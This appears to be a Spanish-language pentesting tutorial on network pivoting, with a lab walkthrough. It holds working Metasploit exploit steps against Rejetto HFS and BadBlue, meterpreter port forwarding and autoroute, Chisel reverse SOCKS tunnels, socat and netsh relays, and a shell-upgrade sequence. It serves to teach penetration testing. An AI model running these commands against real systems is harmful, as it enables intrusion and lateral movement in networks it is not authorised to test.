# Pivoting en Ciberseguridad

## Introducción
El pivoting es una técnica esencial en el mundo de la ciberseguridad que implica moverse lateralmente dentro de una red comprometida para acceder a sistemas y recursos adicionales. Esta técnica es utilizada por los profesionales de seguridad para mantener y expandir el acceso a través de una infraestructura comprometida.

## ¿Qué es el Pivoting?
En términos sencillos, el pivoting se refiere a la acción de utilizar una máquina comprometida como punto de entrada para acceder a otros sistemas dentro de la red. Esta técnica es particularmente útil cuando se ha obtenido acceso a un sistema perimetral y se busca infiltrarse en segmentos de red más internos.

## Tipos de Pivoting
Existen varios tipos de pivoting en función de cómo se realiza el movimiento lateral:

- **Pivoting Directo:** Se realiza desde la máquina comprometida hacia otros sistemas dentro de la misma red.
- **Pivoting a Través de Saltos:** Implica moverse a través de múltiples máquinas comprometidas para alcanzar el objetivo deseado.
- **Pivoting en Cadena:** Consiste en conectar varios sistemas comprometidos para llegar a la red objetivo.

## Herramientas y Técnicas
Para llevar a cabo el pivoting, los profesionales de seguridad utilizan herramientas y técnicas específicas, como:

- **SSH Túneles:** Establecer conexiones seguras a través de SSH para redirigir tráfico.
- **Proxychains:** Enrutamiento de tráfico a través de una cadena de proxies.
- **Port Forwarding:** Redireccionamiento de puertos para acceder a servicios internos.
- **VPN y Socks:** Uso de VPN o servidores SOCKS para ocultar el origen del tráfico.

## Importancia en la Ciberseguridad
El pivoting es una habilidad crucial para los analistas de seguridad y los pentesters, ya que les permite comprender la amplitud de una infracción y evaluar la exposición potencial en una red comprometida. Además, ayuda a identificar y remediar posibles puntos de entrada y movimiento lateral en futuros ataques.

## Caso Práctico
![Pivoting](pivoting.png)

Esta imagen en lo personal me encanta, ilustra de manera perfecta de lo que quiere tratar el pivoting, en base a esta imagen vamos a tener una máquina víctima con IP 10.4.20.196 y otra máquina víctica con IP 10.4.20.195. El primer equipo, es vulnerable a rejetto_hfs_exec.
```python
Victim Machine 1 : 10.4.20.196
Victim Machine 2 : 10.4.20.195
nmap -sV 10.4.20.196
//tiene una vulnerabilidad en 80/tcp    open  http               HttpFileServer httpd 2.3
use exploit/windows/http/rejetto_hfs_exec
set rhosts 10.4.20.196
ipconfig
//Interface 12 vemos lo siguiente
IPv4 Address : 10.4.20.196
IPv4 Netmask : 255.255.240.0
//debemos de establecer un ruteo para leer otras IP
run autoroute -s 10.4.20.0/20
background (ahora si guardamos la sesión)
use auxiliary/scanner/portscan/tcp (para escanear puertos)
set rhosts 10.4.20.195 (IP target 2)
set PORTS 1-100
run
//veremos algo como esto
[+] 10.4.20.195:          - 10.4.20.195:80 - TCP OPEN
//retornamos a la sesion para hacer un port foward
session 1
portfwd add -l 1234 -p 80 -r 10.4.20.195 (IP del target 2)
portfwd list (para validar)
//sin cerrar metasploit ejecutamos los siguiente en una terminal
nmap -sV -sS -p 1234 localhost
1234/tcp open  http    BadBlue httpd 2.7
//hay una vulnerabalidad para eso
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.4.20.195 (IP del objetivo 2)
run
background
session
(veremos 2 sesiones !!)
```

## Chisel, Socat y Proxychains
Como no hablar del favorito de todos, te permite realizar el pivoting y moverte de forma lateral por la red teniendo el control de las comunicaciones. Chisel es una herramienta que permite crear túneles TCP sobre conexiones HTTP y HTTPS. Puede ser utilizado tanto en la máquina comprometida como en la máquina atacante para establecer una comunicación segura y encriptada entre ellas. Chisel es útil para sortear restricciones de firewall y para acceder a sistemas internos desde una posición comprometida. Socat es una utilidad multipropósito que permite crear conexiones bidireccionales entre dos puntos. Puede utilizarse para redirigir tráfico, modificar datos en tránsito y más. Socat es versátil y se adapta a diversas necesidades de pivoting. Proxychains es una herramienta que permite enrutar conexiones a través de una cadena de servidores proxy. Es especialmente útil para mantener el anonimato y redirigir tráfico a través de múltiples puntos.

## Chisel

```python
./chisel server --reverse -p 1234 (servidor - tu equipo)
./chisel client 192.168.1.41:1234 R:socks (cliente - víctima)
./chisel client 10.10.0.128:2111 R:8888:socks (segundo cliente - víctima)
```

## Socat

```python
./socat TCP-LISTEN:4343,fork TCP:192.168.1.41:8080
```

## Proxychains

```python
socks5  127.0.0.1 8888
socks5  127.0.0.1 1080
```

## Netsh - Socat en Windows

```python
netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectaddress=192.168.100.128
```

Toma en cuenta lo siguiente, conforme vas aumentando los clientes con el chisel, el puerto debe de ir en el proxychains y lo pones encima del último que has agregado como se muestra en el ejemplo proporcionado.

## Pivoting con Metasploit

```python
run autoroute -s IP/24 (meterpreter)
route add [red de destino] [máscara de subred] [sesión] (metasploit , en caso no tengas sesión de meterpreter)
use auxiliary/server/socks_proxy
socks4 IP 1080 (proxychains)
```

## Consola interactiva

```python
script /dev/null -c bash
control + z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

